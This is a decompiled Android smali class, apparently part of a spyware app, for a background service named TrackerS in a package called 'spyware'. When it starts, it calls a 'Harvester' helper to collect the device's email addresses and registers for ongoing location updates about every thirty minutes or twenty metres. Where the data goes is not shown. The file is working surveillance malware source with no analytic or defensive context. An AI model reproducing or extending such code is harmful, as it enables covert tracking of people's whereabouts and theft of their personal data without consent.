.class public Landroid/spyware/services/TrackerS;
.super Landroid/app/Service;
.source "TrackerS.java"


# instance fields
.field private email_addresses:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private locationListener:Landroid/location/LocationListener;

.field private locationManager:Landroid/location/LocationManager;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 42
    invoke-direct {v0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000(Landroid/spyware/services/TrackerS;)Ljava/util/List;
    .registers 2
    .param p0, "x0"    # Landroid/spyware/services/TrackerS;

    .prologue
    .line 42
    iget-object v0, v1, Landroid/spyware/services/TrackerS;->email_addresses:Ljava/util/List;

    return-object v0
.end method

.method static synthetic access$100(Landroid/spyware/services/TrackerS;)V
    .registers 1
    .param p0, "x0"    # Landroid/spyware/services/TrackerS;

    .prologue
    .line 42
    invoke-direct {v0}, Landroid/spyware/services/TrackerS;->setLocationListener()V

    return-void
.end method

.method private setLocationListener()V
    .registers 10

    .prologue
    const/4 v4, 0x1

    .line 107
    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v9, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    .line 108
    invoke-static {v9, v1}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    add-int/2addr v0, v1

    if-eqz v0, :cond_2f

    .line 109
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v4, Landroid/spyware/services/TrackerS;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "->setLocationListener:insufficient permission"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 129
    :goto_2e
    return-void

    .line 111
    :cond_2f
    new-instance v8, Landroid/location/Criteria;

    invoke-direct {v8}, Landroid/location/Criteria;-><init>()V

    .line 113
    .local v8, "criteria":Landroid/location/Criteria;
    iget-object v0, v9, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v0, v8, v4}, Landroid/location/LocationManager;->getBestProvider(Landroid/location/Criteria;Z)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_50

    .line 114
    const-wide/16 v6, 0x14

    .line 115
    .local v6, "MIN_DISTANCE_CHANGE_FOR_UPDATES":J
    const-wide/32 v2, 0x1b7740

    .line 117
    .local v2, "MIN_TIME_BETWEEN_UPDATES":J
    iget-object v0, v9, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    iget-object v1, v9, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    .line 118
    invoke-virtual {v1, v8, v4}, Landroid/location/LocationManager;->getBestProvider(Landroid/location/Criteria;Z)Ljava/lang/String;

    move-result-object v1

    long-to-float v4, v6

    iget-object v5, v9, Landroid/spyware/services/TrackerS;->locationListener:Landroid/location/LocationListener;

    .line 117
    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_2e

    .line 125
    .end local v2    # "MIN_TIME_BETWEEN_UPDATES":J
    .end local v6    # "MIN_DISTANCE_CHANGE_FOR_UPDATES":J
    :cond_50
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v4, Landroid/spyware/services/TrackerS;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "->setLocationListener:location providers all disabled"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2e
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "intent"    # Landroid/content/Intent;
    .annotation build Landroid/support/annotation/Nullable;
    .end annotation

    .prologue
    .line 143
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 5

    .prologue
    .line 49
    invoke-super {v4}, Landroid/app/Service;->onCreate()V

    .line 52
    const-string v1, "::trace"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-class v3, Landroid/spyware/services/TrackerS;

    invoke-virtual {v3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "->setLocationListener:service started..."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    new-instance v0, Landroid/spyware/utils/Harvester;

    invoke-direct {v0, v4}, Landroid/spyware/utils/Harvester;-><init>(Landroid/content/Context;)V

    .line 56
    .local v0, "harvester":Landroid/spyware/utils/Harvester;
    invoke-virtual {v0}, Landroid/spyware/utils/Harvester;->getEmailAdresses()Ljava/util/List;

    move-result-object v1

    iput-object v1, v4, Landroid/spyware/services/TrackerS;->email_addresses:Ljava/util/List;

    .line 58
    const-string v1, "location"

    invoke-virtual {v4, v1}, Landroid/spyware/services/TrackerS;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/location/LocationManager;

    iput-object v1, v4, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    .line 59
    new-instance v1, Landroid/spyware/services/TrackerS$1;

    invoke-direct {v1, v4}, Landroid/spyware/services/TrackerS$1;-><init>(Landroid/spyware/services/TrackerS;)V

    iput-object v1, v4, Landroid/spyware/services/TrackerS;->locationListener:Landroid/location/LocationListener;

    .line 103
    invoke-direct {v4}, Landroid/spyware/services/TrackerS;->setLocationListener()V

    .line 104
    return-void
.end method

.method public onDestroy()V
    .registers 4

    .prologue
    .line 133
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/TrackerS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onDestroy:service terminated"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 135
    iget-object v0, v3, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_29

    .line 136
    iget-object v0, v3, Landroid/spyware/services/TrackerS;->locationManager:Landroid/location/LocationManager;

    iget-object v1, v3, Landroid/spyware/services/TrackerS;->locationListener:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    .line 138
    :cond_29
    return-void
.end method
